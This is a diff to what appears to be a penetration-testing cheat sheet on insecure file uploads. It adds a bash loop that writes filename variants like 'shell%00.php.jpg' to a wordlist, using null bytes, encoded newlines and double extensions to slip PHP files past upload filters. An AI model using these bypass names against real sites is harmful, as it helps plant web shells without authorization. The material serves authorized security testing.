@@ -1150,6 +1150,18 @@ https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecur
 | XXE/SSRF               | XML, SVG, PDF, PPT, DOC        |
 | DoS                    | ZIP, JPG, PNG                  |
 
+```
+Bash script to generate all permutations of shell
+
+for char in '%20' '%0a' '%00' '%0d0a' '/' '.\\' '.' '…' ':'; do
+    for ext in '.php' '.phps'; do
+        echo "shell$char$ext.jpg" >> wordlist.txt
+        echo "shell$ext$char.jpg" >> wordlist.txt
+        echo "shell.jpg$char$ext" >> wordlist.txt
+        echo "shell.jpg$ext$char" >> wordlist.txt
+    done
+done
+```
 
 ### SQL injection
 
